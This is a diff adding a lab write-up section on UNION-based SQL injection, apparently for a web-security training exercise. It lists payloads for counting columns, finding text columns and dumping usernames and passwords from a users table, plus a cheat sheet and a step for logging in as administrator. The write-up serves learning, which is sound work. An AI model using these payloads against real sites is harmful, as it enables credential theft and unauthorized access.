@@ -306,6 +306,66 @@ On Oracle: Use FROM DUAL if required.
 ### ✅ Lab Status
 > ✔️ Completed - Successfully retrieved admin credentials by finding string-compatible column.
 
+
+---
+<h3 align="center">🧠 Lab 5 - SQL Injection UNION Attack: Retrieving Data from Other Tables</h3>
+
+<p align="center">
+  <b>Lab: SQL injection UNION attack, retrieving data from other tables</b><br>
+  <i>Target: Exfiltrate usernames and passwords from the <code>users</code> table via UNION-based SQL injection.</i>
+</p>
+---
+
+### 🧠 Lab Context
+
+> This lab contains a SQL injection vulnerability in the product category filter.  
+> The vulnerable query is likely similar to:
+```
+SELECT name, description FROM products WHERE category = 'Lifestyle'
+```
+You must inject into the category parameter and use a UNION-based SQL injection to retrieve data from a different table.
+
+### 🎯 Goal
+✅ Retrieve all usernames and passwords from the users table and log in as the administrator.
+
+### 🧠 Step-by-Step Strategy
+####🔹 Step 1: Determine Number of Columns
+Use NULL placeholders in the UNION SELECT until it succeeds:
+
+```
+' UNION SELECT NULL,NULL-- 
+```
+✔️ If the server responds without an error and shows an extra row, then there are 2 columns in the original query.
+
+####🔹 Step 2: Identify Text-Compatible Columns
+Inject known strings to find which columns accept text:
+
+```
+' UNION SELECT 'abc','def'-- 
+```
+✔️ Observe where 'abc' or 'def' appear in the UI — those are the text-compatible columns.
+
+####🔹 Step 3: Extract User Data
+Now inject the following to exfiltrate data from the users table:
+
+```
+' UNION SELECT username, password FROM users-- 
+```
+✅ This will display usernames and passwords on the application's main page.
+
+####💡 Login as Administrator
+Use the credentials you retrieved to log in as the administrator through the provided login form.
+
+🧩 Injection Cheat Sheet
+                  Injection Type	                                         Payload Description
+Number of Columns	  ' UNION SELECT NULL,NULL--	                      Determines correct column count
+Find Text Columns	  ' UNION SELECT 'abc','def'--	                    Identifies text-rendering columns
+Extract Data	      ' UNION SELECT username, password FROM users--	  Retrieves data from users table
+
+### ✅ Lab Status
+✔️ Completed – Successfully exploited SQLi to extract user data and logged in as the administrator.
+
+
 ------
 ### 📚 Learning Takeaways
 
